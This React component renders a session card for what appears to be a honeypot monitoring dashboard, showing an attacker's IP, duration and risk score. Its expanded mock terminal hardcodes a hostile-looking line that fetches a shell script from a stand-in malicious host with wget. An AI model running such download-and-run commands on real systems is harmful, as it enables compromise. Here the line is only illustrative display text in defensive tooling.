import { useState, useEffect } from 'react';
import { Play, Pause, Eye } from 'lucide-react';

interface SessionCardProps {
  session: {
    id: number;
    ip: string;
    country: string;
    duration: number;
    commands: number;
    risk: number;
  };
}

export function SessionCard({ session }: SessionCardProps) {
  const [expanded, setExpanded] = useState(false);
  const [duration, setDuration] = useState(session.duration);

  useEffect(() => {
    const timer = setInterval(() => setDuration((d: number) => d + 1), 1000);
    return () => clearInterval(timer);
  }, []);

  const formatDuration = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div className="bg-gray-800 border-2 border-cyan-500/30 rounded-xl overflow-hidden hover:border-cyan-500/60 transition">
      <div className="p-6">
        <div className="flex items-start justify-between mb-4">
          <div>
            <code className="text-xl font-mono font-bold text-white">{session.ip}</code>
            <div className="flex items-center gap-2 mt-2">
              <span className="text-3xl">{session.country}</span>
              <span className="px-2 py-1 bg-green-500/20 text-green-400 text-xs font-bold rounded border border-green-500/40 flex items-center gap-1">
                <div className="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse" />
                ACTIVE
              </span>
            </div>
          </div>
          <div className={`text-2xl font-bold ${
            session.risk >= 8 ? 'text-red-400' :
            session.risk >= 6 ? 'text-orange-400' :
            'text-yellow-400'
          }`}>
            {session.risk}/10
          </div>
        </div>

        <div className="grid grid-cols-2 gap-4 mb-4">
          <div>
            <div className="text-gray-400 text-sm mb-1">Duration</div>
            <div className="text-white font-mono font-bold">{formatDuration(duration)}</div>
          </div>
          <div>
            <div className="text-gray-400 text-sm mb-1">Commands</div>
            <div className="text-white font-mono font-bold">{session.commands}</div>
          </div>
        </div>

        <div className="flex gap-2">
          <button
            onClick={() => setExpanded(!expanded)}
            className="flex-1 px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold rounded-lg hover:shadow-lg transition flex items-center justify-center gap-2"
          >
            {expanded ? <><Pause className="w-4 h-4" />Hide</> : <><Play className="w-4 h-4" />Watch</>}
          </button>
          <button className="px-4 py-2 bg-gray-700 text-white font-bold rounded-lg hover:bg-gray-600 transition">
            <Eye className="w-4 h-4" />
          </button>
        </div>
      </div>

      {expanded && (
        <div className="bg-black border-t border-cyan-500/30 p-4 font-mono text-sm">
          <div className="text-green-400">$ ssh root@honeypot</div>
          <div className="text-gray-400">Attempting connection...</div>
          <div className="text-green-400">$ wget http://malicious.com/shell.sh</div>
          <div className="text-red-400">! Malware detected</div>
        </div>
      )}
    </div>
  );
}